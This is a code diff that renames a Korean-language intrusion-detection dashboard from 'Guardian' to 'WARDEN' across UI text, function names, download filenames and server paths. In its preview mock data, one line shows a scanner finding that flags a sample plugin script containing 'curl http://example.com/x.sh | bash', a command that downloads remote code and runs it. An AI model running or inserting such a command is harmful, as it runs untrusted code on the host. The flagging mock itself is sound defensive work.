@@ -262,7 +262,7 @@ textarea.txt.desc{resize:none;overflow:hidden;line-height:1.45;font:inherit;whit
 
 <div class="layout">
 <nav class="sidebar" id="sidebar" aria-label="메뉴">
-  <div class="brand">🛡️ Guardian</div>
+  <div class="brand">🛡️ WARDEN</div>
   <a class="navitem" href="#overview" data-view="overview"><span class="ico">📊</span><span>개요</span><span class="navbadge" id="newBadge" hidden></span></a>
   <a class="navitem" href="#packets" data-view="packets"><span class="ico">🔍</span><span>패킷 보기</span></a>
   <a class="navitem" href="#policy" data-view="policy"><span class="ico">⚙️</span><span>보안 정책</span></a>
@@ -325,7 +325,7 @@ textarea.txt.desc{resize:none;overflow:hidden;line-height:1.45;font:inherit;whit
 
 <section class="view" data-view="policy" hidden>
   <h2>⚙️ 보안 정책 제어</h2>
-  <p>탐지된 위협에 대해 Guardian 방화벽(iptables) 차단을 직접 적용하거나 해제할 수 있습니다.</p>
+  <p>탐지된 위협에 대해 WARDEN 방화벽(iptables) 차단을 직접 적용하거나 해제할 수 있습니다.</p>
   <form id="blockForm">
     <label class="lbl" for="blockTarget">차단할 공격자 IP 주소 (또는 mac:aa:bb:cc:dd:ee:ff)</label>
     <input id="blockTarget" class="txt" required>
@@ -348,7 +348,7 @@ textarea.txt.desc{resize:none;overflow:hidden;line-height:1.45;font:inherit;whit
     <thead><tr><th>대상</th><th>이유</th><th>시작</th><th>남은 시간</th><th>메모</th><th></th></tr></thead>
     <tbody id="blockedRows"></tbody>
   </table></div>
-  <p class="caption">🚨 차단을 한꺼번에 모두 풀어야 할 때(긴급 전체 해제)는 보안 서버 터미널에서 <code>gunblock</code> 을 실행하세요.
+  <p class="caption">🚨 차단을 한꺼번에 모두 풀어야 할 때(긴급 전체 해제)는 보안 서버 터미널에서 <code>wunblock</code> 을 실행하세요.
     토큰이 새더라도 방어를 한 번에 풀 수 없도록 대시보드에는 이 기능을 넣지 않았습니다.</p>
 
   <h3>📒 IP별 공격 기록</h3>
@@ -377,7 +377,7 @@ textarea.txt.desc{resize:none;overflow:hidden;line-height:1.45;font:inherit;whit
 <section class="view" data-view="tools" hidden>
   <h2>🧰 도구</h2>
   <p>보안 스크립트·앱(범용 도구)을 수동으로 실행/중지하는 곳입니다. 아래 "도구 올리기"로 올린 뒤 관리자가 서버에서 승인하면 3초 안에 카드로 나타납니다.
-    "탐지 규칙" 메뉴의 <b>플러그인 방식</b> 규칙과는 다른 것입니다 (그쪽은 Guardian 이 주기적으로 자동 실행).
+    "탐지 규칙" 메뉴의 <b>플러그인 방식</b> 규칙과는 다른 것입니다 (그쪽은 WARDEN 이 주기적으로 자동 실행).
     <button class="btn sm" id="pluginRescan" type="button">🔄 지금 다시 찾기</button></p>
   <div class="rulebar">
     <input id="toolSearch" class="txt" type="search" placeholder="🔍 도구 이름·설명·태그 검색 (예: 핑, 포트공격)" autocomplete="off">
@@ -404,9 +404,9 @@ textarea.txt.desc{resize:none;overflow:hidden;line-height:1.45;font:inherit;whit
 
 <section class="view" data-view="rules" hidden>
   <h2>🧪 탐지 규칙</h2>
-  <p>Guardian 이 탐지하는 모든 규칙입니다. 규칙은 보안 서버의 <code>rules/</code> 폴더에 파일 하나씩(<code>.json</code>) 들어 있고, 아래 양식으로 추가하거나
+  <p>WARDEN 이 탐지하는 모든 규칙입니다. 규칙은 보안 서버의 <code>rules/</code> 폴더에 파일 하나씩(<code>.json</code>) 들어 있고, 아래 양식으로 추가하거나
     파일을 넣고 고치면 재시작 없이 5초 안에 적용됩니다. 켜기/끄기/삭제도 바로 적용됩니다. 규칙은 작동 방식에 따라 둘로 나뉩니다:
-    <b>🔥 방화벽 방식</b>(Guardian 이 패킷을 직접 보고 판정)과 <b>🧩 플러그인 방식</b>(주기적으로 스크립트를 실행해 그 판정을 따름)입니다.</p>
+    <b>🔥 방화벽 방식</b>(WARDEN 이 패킷을 직접 보고 판정)과 <b>🧩 플러그인 방식</b>(주기적으로 스크립트를 실행해 그 판정을 따름)입니다.</p>
   <div id="ruleErrors"></div>
   <div id="ruleNotice"></div>
   <div class="rulebar">
@@ -551,7 +551,7 @@ textarea.txt.desc{resize:none;overflow:hidden;line-height:1.45;font:inherit;whit
   <div class="dlgbtns"><button class="btn" id="delCancel" type="button">취소</button><button class="btn primary" id="delOk" type="button">삭제</button></div>
 </dialog>
 <script>
-/* 미리보기 전용 가짜 서버: 실제 Guardian/대시보드 서버 없이 화면을 확인하기 위한 것.
+/* 미리보기 전용 가짜 서버: 실제 WARDEN/대시보드 서버 없이 화면을 확인하기 위한 것.
    모든 데이터는 메모리에만 있고 새로고침하면 처음 상태로 돌아간다. */
 (function () {
   Storage.prototype.getItem = function (k) { return k === "gd_token" ? "preview" : null; };
@@ -625,7 +625,7 @@ textarea.txt.desc{resize:none;overflow:hidden;line-height:1.45;font:inherit;whit
     findings: [{file: "run.sh", line: 2, what: "외부 통신 도구", text: "curl http://example.com/x.sh | bash"}],
     texts: {"plugin.json": '{\n  "id": "demo_scan",\n  "name": "데모 스캔",\n  "command": ["bash", "./run.sh"]\n}', "run.sh": "#!/usr/bin/env bash\ncurl http://example.com/x.sh | bash\n"}}];
 
-  // 침입 상세 분석(미리보기용 예시): 실제 분석은 guardian.py 의 analyze_event 가 만든다
+  // 침입 상세 분석(미리보기용 예시): 실제 분석은 warden.py 의 analyze_event 가 만든다
   const AN = {
     icmp_flood: {name: "핑 플러드", where: ["출발지: 192.168.56.20", "서버와 같은 내부망(192.168.56.0/24) 안의 장비입니다.", "MAC 주소: 08:00:27:aa:bb:cc (ARP 로 확인)", "목표: 이 서버 192.168.56.10"],
       what: ["ping(ICMP)을 대량으로 보내 네트워크 회선과 CPU 를 소모시키는 공격입니다."], burden: "보통", impact: ["램 부담은 비교적 작지만 회선과 CPU 를 채워 정상 통신이 느려질 수 있습니다."]},
@@ -744,7 +744,7 @@ textarea.txt.desc{resize:none;overflow:hidden;line-height:1.45;font:inherit;whit
         wl.push(t); wl.sort(); const freed = t in blocked; delete blocked[t]; log("whitelist", "추가: " + t);
         return reply({ok: true, reason: "", unblocked: freed, whitelist: wl});
       }
-      if (["127.0.0.1", "192.168.56.10", "192.168.57.10"].includes(t)) return reply({ok: false, reason: "서버 자신의 주소는 뺄 수 없습니다 (Guardian 이 자기 자신을 차단하게 됩니다)"});
+      if (["127.0.0.1", "192.168.56.10", "192.168.57.10"].includes(t)) return reply({ok: false, reason: "서버 자신의 주소는 뺄 수 없습니다 (WARDEN 이 자기 자신을 차단하게 됩니다)"});
       const i = wl.indexOf(t);
       if (i < 0) return reply({ok: false, reason: "화이트리스트에 없습니다"});
       wl.splice(i, 1); log("whitelist", "삭제: " + t);
@@ -922,9 +922,9 @@ function dryRunMetric(dryRun) {
 
 // ── 연결 상태: 응답이 끊기면 화면 전체에 알리고, 옛 숫자는 흐리게 ──
 let lastOkAt = 0;
-function setGuardian(up, why) {
+function setWarden(up, why) {
   const conn = $("#conn"), banner = $("#downBanner");
-  conn.textContent = up ? "Guardian 연결됨" : "⚠ 응답 없음";
+  conn.textContent = up ? "WARDEN 연결됨" : "⚠ 응답 없음";
   conn.className = "conn " + (up ? "ok" : "bad");
   banner.hidden = up;
   $("#metrics").classList.toggle("stale", !up);
@@ -932,7 +932,7 @@ function setGuardian(up, why) {
   if (up) { lastOkAt = Date.now(); $("#lastOk").textContent = ""; return; }
   const when = lastOkAt ? new Date(lastOkAt).toTimeString().slice(0, 8) : "없음";
   $("#lastOk").textContent = "마지막 응답 " + when;
-  banner.textContent = `⚠ Guardian 응답 없음: 탐지·차단이 멈췄을 수 있습니다. 화면의 숫자는 마지막으로 받은 값입니다 (마지막 정상 응답 ${when}). ${why || ""}`;
+  banner.textContent = `⚠ WARDEN 응답 없음: 탐지·차단이 멈췄을 수 있습니다. 화면의 숫자는 마지막으로 받은 값입니다 (마지막 정상 응답 ${when}). ${why || ""}`;
   const v = $("#statusValue");
   if (v) v.textContent = "⚠ 응답 없음";
 }
@@ -1014,7 +1014,7 @@ async function loadTop() {
   const [st, evs] = await Promise.all([api("/api/status"), api("/api/events?limit=200")]);
   lastStatus = st;
   ipNotes = st.notes || {};
-  setGuardian(true);
+  setWarden(true);
   setMode(st.dry_run);
   const s = st.stats || {};
   const attacks = evs.events.filter((e) => !ADMIN_TYPES.has(e.type));
@@ -1072,7 +1072,7 @@ function downloadCsv(events) {
   };
   const head = ["시간", "출발지", "출발지 메모", "대상", "유형", "이벤트", "위험도", "상태", "상세"];
   const lines = events.map((e) => [fmtTime(e.timestamp), e.source, noteOf(e.source), e.target, e.type, typeName(e.type), RISK[e.severity] || e.severity, ACTION[e.action] || e.action, e.detail].map(cell).join(","));
-  const a = el("a", {href: URL.createObjectURL(new Blob(["\ufeff" + [head.map(cell).join(","), ...lines].join("\r\n")], {type: "text/csv;charset=utf-8"})), download: "guardian_events.csv"});
+  const a = el("a", {href: URL.createObjectURL(new Blob(["\ufeff" + [head.map(cell).join(","), ...lines].join("\r\n")], {type: "text/csv;charset=utf-8"})), download: "warden_events.csv"});
   document.body.append(a); a.click(); a.remove();
   setTimeout(() => URL.revokeObjectURL(a.href), 5000);
 }
@@ -1146,7 +1146,7 @@ async function downloadPcap(qs, btn) {
     if (r.status === 401) { showLogin(); return; }
     if (!r.ok) { const d = await r.json().catch(() => ({})); alert(d.error || ("오류 " + r.status)); return; }
     const blob = await r.blob();
-    const name = (/filename="([^"]+)"/.exec(r.headers.get("Content-Disposition") || "") || [])[1] || "guardian.pcap";
+    const name = (/filename="([^"]+)"/.exec(r.headers.get("Content-Disposition") || "") || [])[1] || "warden.pcap";
     const a = el("a", {href: URL.createObjectURL(blob), download: name});
     document.body.append(a); a.click(); a.remove();
     setTimeout(() => URL.revokeObjectURL(a.href), 5000);
@@ -1831,7 +1831,7 @@ function uploadCard(u) {
     el("p", {}, u.type === "rule" ? "승인(rules/ 에 '꺼진 상태'로 설치)은 보안 서버 터미널에서만 가능:" : "그래도 영구 설치(plugins/ 로 옮기기)는 보안 서버 터미널에서만 가능:"),
     el("pre", {}, "approve"),
     el("p", {class: "caption"}, `승인 화면 목록에서 '${u.id}' 를 골라 Enter → 끝까지 읽고 '승인' 선택 → yes 입력. ` +
-      `(approve 단축 명령이 없는 서버라면 python3 ~/guardian/dashboard/approve_plugin.py)`),
+      `(approve 단축 명령이 없는 서버라면 python3 ~/warden/dashboard/approve_plugin.py)`),
     box,
     el("div", {class: "row"},
       el("button", {class: "btn sm", type: "button", ...(sb.busy ? {disabled: ""} : {}), onclick: async () => {
@@ -1960,7 +1960,7 @@ async function loadPackets() {
     const box = $("#pkNotice"); clear(box);
     if (!d.enabled) box.append(el("div", {class: "alert info"}, "패킷 기록이 꺼져 있습니다 (보안 서버 config.json 의 packet_view.enabled)."));
     else if (d.unrecorded) box.append(el("div", {class: "caption"}, `초당 기록 한도를 넘어 ${d.unrecorded.toLocaleString()}개는 보관하지 않았습니다 (플러드 중이면 정상입니다).`));
-    if (d.last_seq < pkLast) { pkLast = 0; pkRows = []; pkDraw(); return; }   // Guardian 이 다시 시작됨
+    if (d.last_seq < pkLast) { pkLast = 0; pkRows = []; pkDraw(); return; }   // WARDEN 이 다시 시작됨
     pkLast = d.last_seq;
     if (d.packets.length) { pkRows = d.packets.reverse().concat(pkRows).slice(0, PK_MAX); pkDraw(); }
   } catch (e) { /* 연결 상태는 3초 새로고침이 표시함 */ }
@@ -2008,7 +2008,7 @@ function drawPreflight(st, rules) {
   const item = (ok, text) => el("li", {}, (ok === null ? "ℹ️ " : ok ? "✅ " : "⚠️ ") + text);
   const box = $("#preflight"); clear(box);
   const on = rules.filter((r) => r.enabled), off = rules.filter((r) => !r.enabled), never = on.filter((r) => !ruleHits[r.id]);
-  box.append(item(true, `Guardian 응답 정상 (감시 인터페이스 ${st.interface}, 켜진 지 ${fmtUp(st.uptime_sec)})`),
+  box.append(item(true, `WARDEN 응답 정상 (감시 인터페이스 ${st.interface}, 켜진 지 ${fmtUp(st.uptime_sec)})`),
     item(null, st.dry_run ? "지금 모드: 탐지만 (dry-run). 실제 차단 시연이면 개요에서 바꾸세요" : "지금 모드: 실제 차단"),
     item(!myIp || st.whitelist.includes(myIp), myIp ? `이 PC(${myIp}) ${st.whitelist.includes(myIp) ? "는 화이트리스트에 있음" : "가 화이트리스트에 없음: 차단되면 대시보드에 못 들어옴"}` : "이 PC 주소를 확인하지 못함"),
     item(st.utc_offset === browserOffset(), st.utc_offset === browserOffset() ? `서버와 이 PC 의 시간대가 같음 (${st.utc_offset})` : `서버 시간대(${st.utc_offset})가 이 PC(${browserOffset()})와 다름: 화면은 이 PC 기준이지만 서버 로그와 맞춰 보기 어려움`),
@@ -2064,7 +2064,7 @@ async function refresh(force) {
     await loadTop();
     if (currentView === "policy") drawWhitelist();
   } catch (e) {
-    if (e.message !== "로그인 필요") setGuardian(false, e.message.slice(0, 120));
+    if (e.message !== "로그인 필요") setWarden(false, e.message.slice(0, 120));
   }
   await Promise.allSettled(jobs);
   refreshing = false;
